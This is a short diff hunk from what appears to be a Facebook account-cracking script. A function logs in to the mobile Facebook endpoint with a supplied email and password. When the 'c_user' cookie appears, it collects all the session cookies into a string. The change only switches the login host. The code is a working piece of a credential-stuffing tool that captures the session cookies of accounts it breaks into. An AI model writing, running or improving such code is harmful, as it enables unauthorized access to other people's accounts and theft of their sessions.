@@ -1247,7 +1247,7 @@ def m6(idf,pwv):
    "email":idf,
    "pass":pw,
    "login":"Log In"} 
-   lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data).text
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
